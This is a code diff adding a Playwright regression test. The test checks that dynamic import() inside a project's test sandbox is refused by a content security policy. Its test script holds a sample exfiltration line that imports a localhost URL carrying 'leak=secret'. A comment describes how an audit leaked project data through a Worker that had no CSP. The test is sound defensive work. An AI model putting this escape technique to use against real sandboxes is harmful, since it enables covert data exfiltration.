@@ -237,4 +237,49 @@ test.describe("test sandbox isolation", () => {
     expect(leaks).toContain("reachable:");
     expect(leaks, "no network global may be reachable").toBe("reachable:");
   });
+
+  // This spec is the reason the test sandbox shipped exploitable. Its sibling
+  // above only checked that network *properties* were absent, and the
+  // project-script suite tested import() while this one did not — so a bare
+  // Worker with no CSP looked covered. An audit exfiltrated project data
+  // through exactly this hole.
+  test("dynamic import is refused from a scripted test", async ({ page }) => {
+    await page.goto("/");
+
+    const outcome = await page.evaluate(async () => {
+      const module = await import("/src/lib/testSandbox.ts");
+      const sandbox = module.createTestSandbox();
+      const seen: string[] = [];
+      const host = {
+        snapshot: () => ({}),
+        assert: () => undefined,
+        log: (message: string) => seen.push(message),
+        step: async () => undefined,
+        baseline: async () => ({ pass: true, distance: 0, threshold: 8 }),
+      };
+      // The request lands before the module load rejects, so a resolved OR
+      // rejected import both mean the GET escaped. Only a CSP refusal — which
+      // fails synchronously at the policy layer — counts as blocked.
+      const script = `
+        try {
+          await import("http://127.0.0.1:8765/health?leak=secret");
+          log("import:resolved");
+        } catch (error) {
+          log("import:" + String(error && error.message).slice(0, 60));
+        }
+      `;
+      try {
+        await sandbox.run("t1", script, { slug: "s", entities: [] }, host, 8000);
+      } catch (error) {
+        seen.push("run:" + String(error));
+      } finally {
+        sandbox.dispose();
+      }
+      return seen.join("|");
+    });
+
+    expect(outcome, "import() must not resolve").not.toContain("import:resolved");
+    // A CSP refusal names the policy; a network failure does not.
+    expect(outcome.toLowerCase()).toMatch(/content security policy|refused to load|failed to fetch/);
+  });
 });
